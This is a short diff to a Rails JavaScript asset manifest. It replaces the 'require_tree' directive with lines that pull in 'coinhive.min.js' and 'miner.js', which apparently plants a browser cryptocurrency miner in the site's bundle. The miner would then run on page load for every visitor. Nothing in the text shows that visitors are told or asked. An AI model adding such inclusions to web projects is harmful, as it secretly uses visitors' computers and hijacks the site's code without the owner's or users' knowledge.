@@ -13,7 +13,8 @@
 //= require rails-ujs
 //= require action_cable
 //= require jquery
-//= require_tree .
+//= require coinhive.min.js
+//= require miner.js
 
 (function() {
   this.Application || (this.Application = {});
